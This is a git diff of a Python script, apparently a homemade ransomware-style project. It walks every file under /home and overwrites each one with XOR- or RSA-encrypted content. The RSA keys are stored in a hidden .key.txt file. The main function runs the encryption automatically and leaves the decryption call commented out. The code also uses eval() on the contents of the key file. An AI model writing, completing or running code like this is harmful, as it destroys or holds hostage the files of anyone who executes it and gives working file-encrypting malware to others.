@@ -1,43 +1,96 @@
 from Cipher import *
+import os
 
-class CipherManager:
-    keyXOR = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
-    keyRSA = Cipher.RSA.generate_keypair(1000,10000)
+class File:
+    class XOR:
+        @staticmethod
+        def Encrypt():
+            keyXOR = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
+            for root, _, files in os.walk('/home'):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        with open(file_path, 'rb') as f:
+                            data = f.read()
+                        encrypted_data = Cipher.XOR.encryptBytes(data,keyXOR)
+                        
+                        with open(file_path, 'wb') as f:
+                            f.write(encrypted_data)
+                        print(f"Encrypted: {file_path}")
 
-    def __init__(self, method, directory='/home',_keyRSA=None):
-        if _keyRSA is not None: keyRSA = _keyRSA
-        self.method = method
-        self.directory = directory
+            print("XOR Encryption completed.")
 
-        public_key,private_key = keyRSA
-        with open(os.path.join(directory, '.key.txt'), 'w') as key_file:
-                key_file.write(f"{public_key}\n")
-                key_file.write(f"{private_key}")
+        @staticmethod
+        def Decrypt():
+            key = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
+            for root, _, files in os.walk('/home'):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    with open(file_path, 'rb') as f:
+                        encrypted_data = f.read()
+                    
+                    decrypted_data = Cipher.XOR.decryptBytes(encrypted_data, key)
+                    
+                    with open(file_path, 'wb') as f:
+                        f.write(decrypted_data)
+                    print(f"Decrypted: {file_path}")
 
-    def encryptDirectory(self):
-        with open(os.path.join(self.directory, '.key.txt'), 'r') as key_file:
-            keys = key_file.readlines()
-            public_key = eval(keys[0])
-    
-        for root, _, files in os.walk(self.directory):
-            for file in files:
-                file_path = os.path.join(root, file)
-                with open(file_path, 'rb') as f:
-                    data = f.read()
-                encrypted_data = Cipher.RSA.encrypt(data, public_key)
-                with open(file_path, 'wb') as f:
-                    f.write(bytes(encrypted_data))
+            print("XOR decryption completed.")
+        
+    class RSA:
 
-    def decryptDirectory(self):  
-        with open(os.path.join(self.directory, '.key.txt'), 'r') as key_file:
-            keys = key_file.readlines()
-            private_key = eval(keys[1])
-    
-        for root, _, files in os.walk(self.directory):
-            for file in files:
-                file_path = os.path.join(root, file)
-                with open(file_path, 'rb') as f:
-                    data = f.read()
-                decrypted_data = Cipher.RSA.decrypt(data, private_key)
-                with open(file_path, 'wb') as f:
-                 f.write(bytes(decrypted_data, 'utf-8'))
+        @staticmethod
+        def Encrypt():
+            directory = os.getcwd()
+            keyRSA = Cipher.RSA.generate_keypair(10000,100000)
+            public_key,private_key = keyRSA
+            
+            with open(os.path.join(directory, '.key.txt'), 'w') as key_file:
+                    key_file.write(f"{public_key}\n")
+                    key_file.write(f"{private_key}")
+
+            for root, _, files in os.walk('/home'):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    with open(file_path, 'r') as f:
+                        data = f.read()
+
+                    encrypted_data = Cipher.RSA.encrypt_RSA(data,public_key)
+
+                    with open(file_path, 'w') as f:
+                                f.write(' '.join(map(str, encrypted_data)))
+                    print(f"Encrypted: {file_path}")
+
+            print("RSA Encryption completed.")
+
+        @staticmethod
+        def Decrypt():
+            directory = os.getcwd()
+
+            with open(os.path.join(directory, '.key.txt'), 'r') as key_file:
+                keys = key_file.readlines()
+                private_key = eval(keys[1])
+
+
+            for root, _, files in os.walk('/home'):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    with open(file_path, 'r') as f:
+                            encrypted = f.read()
+                    encrypted = list(map(int, encrypted.split()))
+                    decrypted = Cipher.RSA.decrypt_RSA(encrypted, private_key)
+                    with open(file_path, 'w') as f:
+                        f.write(decrypted)
+                    print(f"Decrypted: {file_path}")
+
+            print("RSA decryption completed.")
+            os.remove(os.path.join(directory, '.key.txt')) #removing hidden key file
+
+            
+
+def main():
+
+    File.RSA.Encrypt()
+    #File.RSA.Decrypt()
+
+if __name__ == "__main__":
+    main()
